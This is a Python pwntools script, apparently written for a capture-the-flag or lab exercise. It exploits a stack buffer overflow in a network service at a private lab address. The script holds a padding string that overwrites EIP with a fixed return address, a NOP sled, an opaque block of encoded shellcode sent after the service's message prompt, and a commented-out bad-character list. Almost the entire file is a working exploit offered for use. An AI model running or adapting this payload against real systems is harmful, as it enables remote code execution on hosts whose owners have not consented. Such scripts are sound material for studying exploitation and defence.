from pwn import *

#set basic junk

context(os="linux", arch="i386")
HOST, PORT = "10.10.93.128" , 9999

# Bad chars 


#badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
#"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# Junk to get to EIP Overwrite

#junk = "A"*2012 + "B"*4 + badchars
mem = p32(0x625014DF)
junk = "A"*2012 + mem + b"\x90" * 32 

# Memory Address Leaked

#mem = p32(0x625014DF)

# Shellcode to Execute 
 
buf = ("\xda\xc9\xbf\x4f\x36\x7b\x21\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x53\x83\xe8\xfc\x31\x78\x13\x03\x37\x25\x99\xd4\x3b\xa1\xdf"
"\x17\xc3\x32\x80\x9e\x26\x03\x80\xc5\x23\x34\x30\x8d\x61\xb9"
"\xbb\xc3\x91\x4a\xc9\xcb\x96\xfb\x64\x2a\x99\xfc\xd5\x0e\xb8"
"\x7e\x24\x43\x1a\xbe\xe7\x96\x5b\x87\x1a\x5a\x09\x50\x50\xc9"
"\xbd\xd5\x2c\xd2\x36\xa5\xa1\x52\xab\x7e\xc3\x73\x7a\xf4\x9a"
"\x53\x7d\xd9\x96\xdd\x65\x3e\x92\x94\x1e\xf4\x68\x27\xf6\xc4"
"\x91\x84\x37\xe9\x63\xd4\x70\xce\x9b\xa3\x88\x2c\x21\xb4\x4f"
"\x4e\xfd\x31\x4b\xe8\x76\xe1\xb7\x08\x5a\x74\x3c\x06\x17\xf2"
"\x1a\x0b\xa6\xd7\x11\x37\x23\xd6\xf5\xb1\x77\xfd\xd1\x9a\x2c"
"\x9c\x40\x47\x82\xa1\x92\x28\x7b\x04\xd9\xc5\x68\x35\x80\x81"
"\x5d\x74\x3a\x52\xca\x0f\x49\x60\x55\xa4\xc5\xc8\x1e\x62\x12"
"\x2e\x35\xd2\x8c\xd1\xb6\x23\x85\x15\xe2\x73\xbd\xbc\x8b\x1f"
"\x3d\x40\x5e\xb5\x35\xe7\x31\xa8\xb8\x57\xe2\x6c\x12\x30\xe8"
"\x62\x4d\x20\x13\xa9\xe6\xc9\xee\x52\x19\x56\x66\xb4\x73\x76"
"\x2e\x6e\xeb\xb4\x15\xa7\x8c\xc7\x7f\x9f\x3a\x8f\x69\x18\x45"
"\x10\xbc\x0e\xd1\x9b\xd3\x8a\xc0\x9b\xf9\xba\x95\x0c\x77\x2b"
"\xd4\xad\x88\x66\x8e\x4e\x1a\xed\x4e\x18\x07\xba\x19\x4d\xf9"
"\xb3\xcf\x63\xa0\x6d\xed\x79\x34\x55\xb5\xa5\x85\x58\x34\x2b"
"\xb1\x7e\x26\xf5\x3a\x3b\x12\xa9\x6c\x95\xcc\x0f\xc7\x57\xa6"
"\xd9\xb4\x31\x2e\x9f\xf6\x81\x28\xa0\xd2\x77\xd4\x11\x8b\xc1"
"\xeb\x9e\x5b\xc6\x94\xc2\xfb\x29\x4f\x47\x1b\xc8\x45\xb2\xb4"
"\x55\x0c\x7f\xd9\x65\xfb\xbc\xe4\xe5\x09\x3d\x13\xf5\x78\x38"
"\x5f\xb1\x91\x30\xf0\x54\x95\xe7\xf1\x7c")

# Connect to HOST
p = remote(HOST,PORT) 
p.recvuntil("Please enter your username (max 20 characters):")
p.sendline("lol")
p.recvuntil("Write a message:")
p.sendline(junk + buf)
